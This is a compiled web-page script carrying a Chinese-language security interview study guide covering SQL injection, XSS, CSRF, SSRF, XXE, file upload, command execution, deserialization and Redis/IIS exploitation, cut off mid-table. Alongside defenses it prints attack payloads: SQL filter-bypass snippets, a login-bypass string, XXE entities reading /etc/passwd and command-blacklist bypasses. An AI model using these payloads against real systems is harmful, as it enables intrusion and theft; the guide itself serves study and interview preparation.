import{_ as i}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as l,c as p,a as s,b as a,d as t,e,r as o}from"./app.02b19a3e.js";const d={},c=e(`<p>梳理网络安全知识点为自己查漏补缺，或者说是面经总结也OK。</p><h2 id="web安全" tabindex="-1"><a class="header-anchor" href="#web安全" aria-hidden="true">#</a> Web安全</h2><h3 id="sql注入" tabindex="-1"><a class="header-anchor" href="#sql注入" aria-hidden="true">#</a> SQL注入</h3><details class="custom-container details"><summary>SQL注入的原理？注入方式？怎么防御？</summary><p>Web应用对用户输入的数据校验处理不严，致使用户可以拼接执行SQL语句；</p><p><strong>注入方式有</strong></p><p>布尔型盲注：根据页面返回的结果判断条件真假</p><p>时间型盲注：根据页面返回时间是否增加判断是否存在注入</p><p>基于错误的注入：页面返回错误信息</p><p>联合查询注入：可用union的情况下</p><p>堆叠查询注入：可同时执行多条语句</p><p>使用参数化查询，因为数据库不会把参数的内容当作SQL指令的一部分拼接执行，而是在数据库完成SQL指令的编译后才套用参数运行，这就是预编译</p></details><details class="custom-container details"><summary>预编译不能防范的注入如何修复？</summary><p>order by 注入不能用预编译防御。</p><p>预编译会自动给传入的参数加上单引号，order by后边的字段名会变成字符串造成SQL语法错误</p><p>order by之后跟的字段名肯定有限，且是数据库中已经存在的字段，可以使用白名单限制字段名</p></details><details class="custom-container details"><summary>盲注是什么？怎么盲注？</summary><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式。（Time 和 Boolean）</p><p>可以用benchmark，sleep等函数造成延时效果，如果关键字被过滤了，可以让两个非常大的数据表做笛卡尔积产生大量的计算从而产生时间延迟。</p></details><details class="custom-container details"><summary>宽字节注入是什么原理？</summary><p>在数据库中使用了宽字符集(GBK，GB2312等)，除了英文都是一个字符占两字节；</p><p>MySQL在使用GBK编码的时候，会认为两个字符为一个汉字(ascii&gt;128才能达到汉字范围)；</p><p>在PHP中使用addslashes函数的时候，会对单引号%27进行转义，在前边加一个反斜杠”\\”，变成%5c%27;</p><p>可以在前边添加%df,形成%df%5c%27，而数据进入数据库中时前边的%df%5c两字节会被当成一个汉字，%5c被吃掉了，单引号由此逃逸可以用来闭合语句。</p></details><details class="custom-container details"><summary>MySQL时间型盲注如何加快速度？</summary><p>1）Windows平台上可以用DNSlog加速注入</p><p>2）利用二分查找法</p><ul><li>利用 ASCII 码作为条件来查询，ASCII 码中字母范围在65~122之间</li><li>以这个范围的中间数为条件，判断payload中传入的 ASCII 码是否大于这个中间数</li><li>如果大于，就往中间数122这块查找。反之亦然</li></ul></details><details class="custom-container details"><summary>mysql的用户名密码是存放在那张表里面？mysql密码采用哪种加密方式？</summary><p>mysql数据库的user表，以MySQL 4.1版本为分界线，两种加密方式。</p><p>mysql323加密：（16位）、mysqlSHA1加密：（去掉*号40位）</p></details><details class="custom-container details"><summary>mysql版本低于5.0怎么注入？</summary><p>MySQL 5.0以下没有<code>information_schema</code>这个系统表，无法列表名；</p><p>安全狗3.5版本会拦截information_schema关键字；这个时候可以利用虚表取数据；</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> b <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>过滤逗号的SQL注入如何绕过？</summary><p>联合查询的情况可以使用join和别名绕过</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--原sql命令</span>

<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用from...for绕过</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39; and ascii(substr((select database()),1,1))=xxx#

&#39;</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>xxx<span class="token operator">%</span><span class="token number">23</span>

<span class="token comment">--如果过滤了空格，可以用括号代替空格</span>
&#39; <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>xxx<span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>过滤limit后的逗号如何绕过？</summary><p>使用offset关键字绕过</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token comment">--此时 limit 1 offset 2 可以代替 limit 1,2</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>尖括号被过滤怎么办？</summary><p>可以使用<code>between and</code>代替尖括号，并用16进制，来绕过单引号的过滤</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">between</span> <span class="token string">&#39;a&#39;</span> <span class="token operator">and</span> <span class="token string">&#39;z&#39;</span><span class="token punctuation">;</span>   <span class="token comment">--原sql</span>
<span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">between</span> <span class="token number">0x61</span> <span class="token operator">and</span> <span class="token number">0x7a</span><span class="token punctuation">;</span> <span class="token comment">--16进制</span>

<span class="token comment">--在sqlmap中使用between and 代替其它字符加上 --tamper=between 即可</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>如何绕过WAF，实战与原理？</summary><p>关键字双写绕过</p><p>内联注释执行SQL</p><p>注释符加%0a换行执行SQL</p><p>空格被过滤，用%0a、%0b、%0c、%0d、%09、%A0代替</p><p>利用HTTP/1.1新特性pipeline，在第二个数据包带入脏数据，\`Chunked分块传输\`\`\`</p></details><details class="custom-container details"><summary>如何通过sql注入写shell，条件是什么?</summary><p>可以使用outfile或dumpfile将shell写到网站目录</p><p>dumpfile每次只能导出一行数据，不会在末尾追加行，可用来写入二进制文件</p><p><strong>利用条件</strong></p><p>1）数据库用户为root权限</p><p>2）知道网站绝对路径，且有写入权限</p><p>3）PHP的GPC为off状态（魔术引号 POST、GET、Cookie）</p></details><h3 id="同源策略" tabindex="-1"><a class="header-anchor" href="#同源策略" aria-hidden="true">#</a> 同源策略</h3><details class="custom-container details"><summary>简述一下什么是同源策略，如何规避？</summary><p>所谓同源是指两个网页，协议、主机、端口都相同。</p><p>A网页设置的Cookie，B网页不能读取，除非这两个网页同源。</p><p>可以使用JSONP和CORS规避同源策略。</p></details><details class="custom-container details"><summary>B站与A站不同源的情况下如何从B站获取到A站用户信息?</summary><p>两个网页一级域名相同，只是二级域名不同</p><p>浏览器允许通过设置document.domain属性共享 Cookie，拿到DOM等</p><p>在根域范围内，可以 把domain属性的值设置为它的上一级域</p></details><details class="custom-container details"><summary>JSONP和CORS有何区别？</summary><p>Jsonp只适用GET方法</p><p>通过在客户端动态创建一个 script 标签，src 属性指向一个跨域的 URL</p><p>服务端返回一段可执行的js脚本，脚本的内容是一个函数的调用，函数的参数是要传输的数据</p><p>CORS跨域资源共享支持GET、POST方法</p><p>通过在服务器端设置响应头部信息来控制资源是否允许跨域访问</p><p>服务器端在响应请求时，返回一个 Access-Control-Allow-Origin 头部信息</p><p>浏览器根据该头部信息判断是否允许访问该资源</p></details><details class="custom-container details"><summary>JSONP和CORS有何缺陷如何修复？</summary><p>JSONP劫持。</p><p>攻击者利用JSONP的工作方式来进行攻击，他们会在受害者的网站中注入恶意代码，并在其中使用JSONP请求一个恶意网站上的URL，同时指定一个自己控制的回调函数名。这样恶意网站就会将数据包装在这个回调函数名中返回给受害者网站，受害者网站就会在本地执行这个回调函数，从而执行了攻击者注入的恶意代码。攻击者可以利用这个漏洞来窃取用户数据或在受害者网站上执行恶意操作。</p><p>JSONP劫持漏洞的主要原因是在客户端使用<code>script</code>标签获取跨域数据时，没有对回调函数名进行验证或限制，导致攻击者可以使用任意的回调函数名来获取数据，并在本地执行恶意代码。因此，为了防止JSONP劫持漏洞，必须对回调函数名进行限制和验证，确保只接受合法的回调函数名。</p></details><details class="custom-container details"><summary>JSONP和CORS在修复过程中是如何传递token的？</summary><ol><li>JSONP：由于 JSONP 是通过动态创建 <code>&lt;script&gt;</code> 标签的方式获取数据，因此无法使用标准的 HTTP 头部来传递 Token。通常情况下，Token 被包含在 URL 的查询字符串参数中，例如 <code>http://example.com/data?callback=handleData&amp;token=xxxxxx</code>。服务器接收到请求后，将 Token 包含在返回的 JavaScript 代码中，以便客户端可以在处理数据时使用 Token 进行身份验证和授权。</li><li>CORS：在使用 CORS 进行跨域请求时，客户端需要向服务器发送一个预检请求（OPTIONS 请求），以检查是否允许跨域请求和使用哪些 HTTP 方法、头部和身份验证方法。在预检请求中，客户端会将 Token 包含在请求的头部中，例如 <code>Authorization: Bearer xxxxxx</code>。如果服务器返回的响应头部中包含了 <code>Access-Control-Allow-Headers</code> 和 <code>Access-Control-Allow-Methods</code>，则表示允许使用这些头部和方法进行跨域请求，客户端随后可以发送真实的请求并将 Token 包含在头部中进行身份验证和授权。</li></ol><p>无论是 JSONP 还是 CORS，在传递 Token 时都要遵守安全最佳实践，例如使用 HTTPS 协议进行传输、对 Token 进行加密或哈希处理、在服务器端对 Token 进行验证等等。</p></details><details class="custom-container details"><summary>CORS如果是不允许的域发起了请求，会返回什么？</summary><p>如果服务器否定了&quot;预检&quot;请求，会返回一个正常的HTTP回应，但没有任何<em>CORS</em>相关的头信息字段</p></details><details class="custom-container details"><summary>JSONP的token跟在哪个位置？</summary><p>在 JSONP 请求中，Token 参数通常是作为该函数的参数名出现</p></details><details class="custom-container details"><summary>JSONP referer校验能否百分百防护吗？</summary><p>可以</p></details><details class="custom-container details"><summary>为什么同源策略无法防御CSRF？</summary><p>因为同源策略只适用于读取数据而不写入数据的情况</p><p>CSRF通过构造表单从用户的浏览器来注入额外的网络请求</p></details><h3 id="xss跨站" tabindex="-1"><a class="header-anchor" href="#xss跨站" aria-hidden="true">#</a> XSS跨站</h3><details class="custom-container details"><summary>XSS原理分类和防御方法？</summary><h4 id="原理" tabindex="-1"><a class="header-anchor" href="#原理" aria-hidden="true">#</a> 原理</h4><p>应用程序发送给浏览器的页面中包含用户提交的数据，但没有经过适当验证或转义时</p><p>攻击者通过在受害者的网页中注入恶意脚本，从而在受害者的浏览器中执行恶意代码</p><h4 id="分类" tabindex="-1"><a class="header-anchor" href="#分类" aria-hidden="true">#</a> 分类</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1）反射型
攻击者将恶意脚本注入到 URL 参数或表单输入中
网站服务器接收到请求后，将恶意脚本从请求中取出并返回给用户浏览器，浏览器执行恶意脚本

2）存储型
攻击者将恶意脚本注入到受害者提交的数据中，数据被存储在服务器上
当其他用户访问包含恶意脚本的网页时，恶意脚本会从服务器中取出并在用户浏览器中执行

3）DOM型
攻击者将恶意脚本注入到网页的 DOM 元素中
当用户访问包含恶意脚本的网页时，浏览器会解析 DOM 元素并执行其中的恶意脚本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="防御" tabindex="-1"><a class="header-anchor" href="#防御" aria-hidden="true">#</a> 防御</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1）对输入和输出的字符实体进行编码转义
2）使用HttpOnly禁止js读取cookie，防止攻击者窃取会话令牌
3）用CSP内容安全策略，限制网页中可执行的脚本来源
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>DOM型XSS是什么，如何自动化防御？</summary><p>DOM型返回页面源码中看不到输入的payload， 而是保存在客户端浏览器的DOM中</p><p>为了自动化防御DOM型XSS，可以采用以下方法</p><p>1）使用CSP内容安全策略</p><p>2）使用自动化工具检测和修复：如Google的DOM XSS Auditor</p></details><details class="custom-container details"><summary>XSS中HttpOnly Secure 和CSP分别是干什么用的，如何实现的？</summary><p>1）通过在<code>Set-Cookie</code>标头中添加<code>HttpOnly</code>属性来实现禁止js读取Cookie.</p><p>2）通过在<code>Set-Cookie</code>标头中添加<code>Secure</code>属性来实现只允许HTTPS协议传输Cookie.</p><p>3）通过在HTTP响应头中添加<code>Content-Security-Policy</code>标头，限制网页中可执行的脚本来源.</p></details><h3 id="csrf" tabindex="-1"><a class="header-anchor" href="#csrf" aria-hidden="true">#</a> CSRF</h3><details class="custom-container details"><summary>什么是CSRF？如何防御？</summary><p>在执行关键操作时没有进行是否由客户自愿发起的确认，造成客户端请求伪造。</p><p>攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。</p><p>修复方法</p><p>1、验证Referer（有被绕过的风险，从HTTPS页面跳转到HTTP页面时Referer不会被传递）</p><p>2、添加token（保证随机性和一次性）</p></details><details class="custom-container details"><summary>GET和POST利用方法区别？</summary><p>GET型，只需要构造URL，然后诱导受害者访问利用</p><p>POST型，需要构造自动提交或点击提交的表单，然后诱导受害者访问或点击利用</p></details><p>json格式的CSRF如何利用？</p>`,33),r={href:"https://xz.aliyun.com/t/7911",target:"_blank",rel:"noopener noreferrer"},u=e(`<h3 id="ssrf" tabindex="-1"><a class="header-anchor" href="#ssrf" aria-hidden="true">#</a> SSRF</h3><details class="custom-container details"><summary>SSRF的漏洞原理和危害？</summary><p>SSRF服务端请求伪造，由服务端发起，攻击外网无法访问的内部系统；</p><p>比如某识图网站，对目标地址没做合法性验证，就会造成SSRF。</p><p>可用于扫内网端口、file协议读文件、GOPHER打内网应用</p></details><details class="custom-container details"><summary>SSRF的利用手段，哪些协议可以利用？</summary><p>http/s探测内网存活主机</p><p>FILE协议读取文件</p><p>DICT协议攻击redis数据库Getshell</p><p>GOPHER协议打FastCGI</p></details><details class="custom-container details"><summary>结合内网redis 如何利用，getshell的手法？</summary><p>DICT协议写定时任务反弹shell</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">dict</span><span class="token punctuation">:</span><span class="token header-value">//x.x.x.x:6379/info</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>详细说下gopher协议</summary><p>GOPHER支持发出GET、POST请求；</p><p>可以先截获get请求包和post请求包，再构造成符合gopher协议的请求；</p><p>GOPHER协议是SSRF利用中一个最强大的协议 (俗称万能协议) 可用于反弹shell。</p></details><details class="custom-container details"><summary>SSRF如何绕过防御措施？</summary><p>1）使用回环地址（127.0.0.1）的十进制、十六进制等</p><p>2）利用URL解析器滥用</p><p>3）301、302跳转绕过</p><p>4）利用DNS重绑</p></details><details class="custom-container details"><summary>SSRF的DNS重绑定有了解吗，如何修复？</summary></details><h3 id="xxe注入" tabindex="-1"><a class="header-anchor" href="#xxe注入" aria-hidden="true">#</a> XXE注入</h3><details class="custom-container details"><summary>什么是XXE漏洞，如何防御措施？</summary><p>XML外部实体注，可让攻击者利用XML解析器处理用户输入的XML数据，从而读取系统文件、执行远程代码。</p><blockquote><p><strong>防御措施如下</strong></p><p>1）验证和过滤用户输入的XML数据，过滤SYSTEM关键字</p><p>2）禁用外部实体</p><p>3）更新XML解析器和相关组件</p></blockquote></details><details class="custom-container details"><summary>如何判断网站是否存在XXE ？</summary><p>Burp抓包，修改HTTP请求方法、Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</p></details>`,10),m={class:"custom-container details"},v=s("summary",null,"无回显XXE如何利用?",-1),k=s("p",null,"利用XML错误消息和时间延迟判断注入是否成功",-1),b=s("p",null,"可以利用外部实体来与攻击者控制的服务器进行交互，以此来获取相关信息",-1),h={href:"https://blog.csdn.net/weixin_39685392/article/details/111293939",target:"_blank",rel:"noopener noreferrer"},g=e(`<details class="custom-container details"><summary>XXE过滤了SYSTEM关键字如何绕过?</summary><p>1）使用特殊字符来欺骗过滤器，例如使用空格、制表符或换行符</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">test</span> <span class="token attr-name">ANY</span> <span class="token punctuation">&gt;</span></span>
&lt;!ENTITY % externalSystem SYSTEM &quot;file:///etc/passwd&quot;&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">start</span> <span class="token attr-name">&quot;&lt;![CDATA[&quot;</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">end</span> <span class="token attr-name">&quot;]]</span><span class="token punctuation">&gt;</span></span>&quot;&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">payload</span> <span class="token attr-name">&quot;%start;%externalSystem;%end;&quot;</span><span class="token punctuation">&gt;</span></span>
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;payload;">&amp;payload;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2）使用URL编码来绕过关键字过滤器</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>SYSTEM关键字编码为 %53%59%53%54%45%4d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>3）在XML实体中使用别名代替SYSTEM关键字</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY mysystem &quot;file:///etc/passwd&quot;&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;mysystem;">&amp;mysystem;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h3 id="文件处理" tabindex="-1"><a class="header-anchor" href="#文件处理" aria-hidden="true">#</a> 文件处理</h3><details class="custom-container details"><summary>文件上传漏洞的绕过方法和防范措施？</summary><p>1）客户端js校验</p><p>2）MIME文件头Content-Type字段(image/gif)校验</p><p>3）文件头内容检测(GIF89a)</p><p>4）文件扩展名校验黑名单</p><p>上传真实的图片Burp拦截修改数据包，木马内容跟在图片后边，修改扩展名</p><p>黑名单找漏网之鱼(.php4.cer.pHP大小写绕过)</p><p><strong>文件上传防范措施</strong></p><p>1）文件上传目录设置为不可执行 2）使用白名单判断文件上传类型</p></details><details class="custom-container details"><summary>文件包含漏洞如何利用？</summary><p>文件包含函数，include、require;</p><p>利用条件：include()等函数通过动态变量的方式引入包含文件，用户能够控制该动态变量</p><p>本地文件包含：file协议读文件，php://filter封装协议读源码</p><p>远程文件包含：allow_url_include=On，远程包含webshell</p></details><h3 id="命令执行" tabindex="-1"><a class="header-anchor" href="#命令执行" aria-hidden="true">#</a> 命令执行</h3><details class="custom-container details"><summary>php有哪些命令执行函数？</summary><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">//执行外部程序并且显示原始输出</span>
<span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">//在当前进程空间执行指定程序</span>
<span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment">//打开进程文件指针</span>
<span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">//执行一个命令，并且打开用来输入/输出的文件指针</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>黑名单绕过</summary><p>1）用\${IFS}代替空格</p><p>2）单引号、双引号： c””at、ca’’t、反斜线 c\\at</p><p>3）可用%0A换行执行命令，换行符自身是一个有效的目录分隔符</p></details><details class="custom-container details"><summary>如何绕过php.ini中的disable_function函数限制？</summary></details><details class="custom-container details"><summary>文件上传中\`%00\`截断的原理是什么，官方是如何设计修复方案的?</summary></details><h3 id="反序列化" tabindex="-1"><a class="header-anchor" href="#反序列化" aria-hidden="true">#</a> 反序列化</h3><details class="custom-container details"><summary>Java/PHP反序列化产生原因，如何防御？</summary><p>由于Java序列化机制的特殊性质，攻击者可以在序列化和反序列化的过程中注入恶意代码</p><ol><li>不受信任的数据来源：如果应用程序接受来自不受信任的数据源（例如网络输入或文件输入）</li><li>反序列化过程中缺乏验证：在反序列化对象时，应用程序可能没有对反序列化数据进行验证</li></ol><p>以下是一些可能的防御措施：</p><ol><li>限制应用程序接受数据的来源，避免来自不受信任的数据源的输入</li><li>在反序列化数据时，对数据进行验证，并拒绝不合法的数据</li><li>在序列化和反序列化数据时，使用加密算法加密数据，从而保护数据不被攻击者操纵</li><li>使用安全的Java序列化库，例如Google的Gson，这些库支持反序列化过程中对数据进行验证</li><li>及时更新和修补应用程序和操作系统，以修复已知的安全漏洞和弱点，减少攻击者利用漏洞的机会</li></ol></details><details class="custom-container details"><summary>JNDI注入的原理</summary><p>JNDI(JavaNaming and Directory Interface,Java命名和目录接口)是一组在Java应用中访问命名和目录服务的API，JNDI规范允许我们通过对象的名称来访问这个数据源对象，而该对象可能储存在不同的命名或目录服务中，例如JDBC、LDAP、RMI、DNS、NIS、CORBA。</p><p>其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等</p><p>JNDI注入通过远程加载远程class执行恶意代码</p><p>攻击者可以通过构造恶意的JNDI URL（Uniform Resource Locator），将恶意对象注册到JNDI目录服务器中，并在Java应用程序中使用该URL来获取对象，从而导致恶意代码执行。</p></details><h3 id="渗透经验和技巧" tabindex="-1"><a class="header-anchor" href="#渗透经验和技巧" aria-hidden="true">#</a> 渗透经验和技巧</h3><details class="custom-container details"><summary>如果给你一个网站你如何判断后端是什么数据库？</summary><p>1）通过开放端口判断</p><p>2）通过网站开发使用的技术栈判断</p><p>3）尝试让网站报数据库语法错误判断</p><p>常见技术栈组合如下</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>PHP + MySQL + Apache
ASP + MSSQL + IIS
JSP + Oracle + Tomcat
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>只有一个登录框如何渗透测试？</summary><p>1）SQL注入万能密码 ( admin&#39; or 1=1 --)</p><p>2）弱口令爆破</p><p>3）目录扫描</p><p>4）目录遍历，crtl+u查看源码，访问静态文件目录尝试遍历目录</p><p>5）URLfinder查找敏感信息</p><p>6）逻辑漏洞（任意用户注册、改返回包验证绕过）</p></details><h2 id="攻防对抗" tabindex="-1"><a class="header-anchor" href="#攻防对抗" aria-hidden="true">#</a> 攻防对抗</h2><h3 id="信息收集" tabindex="-1"><a class="header-anchor" href="#信息收集" aria-hidden="true">#</a> 信息收集</h3><details class="custom-container details"><summary>你是如何做资产信息收集的？</summary><p>即查找目标所有的暴露面</p><p>1）企业组织架构信息收集（域名、APP和小程序、子公司和对外投资、供应商）</p><p>2）子域名枚举（自己开发工具-被动收集加主动爆破）</p><p>3）IP资产梳理（准确IP全端口、C段常见端口、目标开放服务和Web应用指纹识别）</p><p>4）目录扫描（后台、备份文件、敏感页面、未授权接口）</p><p>5）敏感信息（文档、Github搜源码、Google hacker）</p></details><details class="custom-container details"><summary>打点方式常用哪些漏洞？</summary><p>Web：弱口令+文件上传、SQL注入</p><p>中间件：Shiro反序列化、Weblogic反序列化</p><p>OA：致远、通达、蓝凌</p></details>`,19),y={class:"custom-container details"},S=s("summary",null,"如何绕过网站CDN获取真实IP？",-1),x={href:"http://xxx.com",target:"_blank",rel:"noopener noreferrer"},T=s("p",null,"2）解析子域名，或许有没上CDN的",-1),I=s("p",null,"3）让服务器主动发起请求（SSRF漏洞、注册让其发邮件）",-1),f=e(`<h3 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h3><details class="custom-container details"><summary>Redis未授权访问如何利用，利用条件是什么?</summary><p><strong>利用条件</strong>：</p><blockquote><p>当redis以root账户运行，无密码或者弱密码认证，并且绑定0.0.0.0可非本机访问的情况下；</p></blockquote><p><strong>Linux利用方式</strong></p><blockquote><p>上传SSH公钥登录SSH，原理是在redis中插入一条数据；</p><p>在Web目录写Webshell;</p><p>Crontab定时任务反弹shell；</p><p>利用slave主从复制实现RCE远程命令执行;</p></blockquote><p><strong>Windows利用方式</strong></p><blockquote><p>Web目录写Webshell</p><p>写入启动项（需重启）</p><p>写入MOF（仅限03系统）</p></blockquote><p><strong>防御措施</strong></p><blockquote><p>1、降权运行redis</p><p>2、使用复杂的密码</p><p>3、限制IP禁止外网访问</p><p>4、另外redis默认不生成日志，可以自己配置来生成日志</p></blockquote></details><details class="custom-container details"><summary>redis getshell中什么样的操作比较危险？</summary><p>主从复制getshell的时候全量复制可能会覆盖原有数据。</p></details><details class="custom-container details"><summary>IIS有哪些历史漏洞？</summary><p>1）<strong>IIS 6.0 PUT文件上传漏洞</strong></p><blockquote><p>开启WebDAV服务、网站目录允许来宾用户写入可用IISPutScanner工具上传文件</p></blockquote><p>2）<strong>IIS6.0 解析漏洞</strong></p><blockquote><p><strong>基于文件</strong></p><p>IIS6.0默认不解析<code>;</code>号后面的内容，例如<code>1.asp;.jpg</code>会当成<code>1.asp</code>解析，相当于分号截断。</p><p><strong>基于文件夹</strong></p><p>IIS6.0会将<code>/*.asp/</code>文件夹下的文件当成asp解析。</p></blockquote><p>3）<strong>IIS7.0/7.5 解析漏洞</strong></p><p>IIS7.*在FastCGI运行php的情况下，php默认配置<code>cgi.fix_pathinfo=1</code>，导致在任意文件后面添加<code>/.php</code>，服务器就会解析成php。</p></details><details class="custom-container details"><summary>IIS对应windows系统版本</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>Windows Server <span class="token number">2003</span> 			<span class="token comment">#IIS 6.0</span>
Windows Server <span class="token number">2008</span> SP2，SP3	   <span class="token comment">#IIS 7.0 </span>
